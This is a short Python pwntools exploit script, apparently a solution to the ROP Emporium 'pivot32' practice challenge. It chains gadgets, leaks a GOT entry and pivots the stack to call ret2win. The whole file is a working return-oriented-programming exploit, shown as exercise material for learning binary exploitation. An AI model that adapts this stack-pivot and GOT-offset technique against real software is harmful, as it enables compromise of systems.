from pwn import *

DEBUG = False

elf = ELF("./pivot32")
gs = """
b *pwnme+198
b *foothold_function+42
"""
if DEBUG:
    io = gdb.debug(elf.path, gdbscript=gs)
else:
    io = process(elf.path)

# found using ropper
pop_ebp = 0x0804889b        # pop ebp; ret;
leave = 0x080485f5          # leave; ret;
pop_eax = 0x0804882c        # pop eax; ret;
read_memo_eax = 0x08048830  # mov eax, dword ptr [eax]; ret;
pop_ebx = 0x080484a9        # pop ebx; ret;
add_eax_ebx = 0x08048833    # add eax, ebx; ret;
call_eax = 0x080485f0       # call eax;

# nm libpivot32.so | grep " T "
# 0000077d T foothold_function
# 00000974 T ret2win
ret2win_offset = 0x974 - 0x77d  # relative to foothold_function.
foothold_func_got_plt = 0x804a024

rop_chain = b'AAAA'  # starts with junk for the leave instruction (pops a value to ebp).
rop_chain += p32(elf.sym.foothold_function)  # call it first to update its .got.plt entry.
rop_chain += p32(pop_eax) + p32(foothold_func_got_plt) + p32(read_memo_eax)
rop_chain += p32(pop_ebx) + p32(ret2win_offset)
rop_chain += p32(add_eax_ebx) + p32(call_eax)

io.recvuntil("a place to pivot: ")
pivot_addr = int(io.recvline().strip(), 16)
print("pivot_addr:", hex(pivot_addr))
io.recvuntil("> ")
io.sendline(rop_chain)
io.recvuntil("> ")

offset = 44
payload = cyclic(offset) + p32(pop_ebp) + p32(pivot_addr) + p32(leave)
io.sendline(payload)

io.wait()  # forr debugging in gdb
io.recvuntil("Thank you!\n")
print(io.recv().decode())
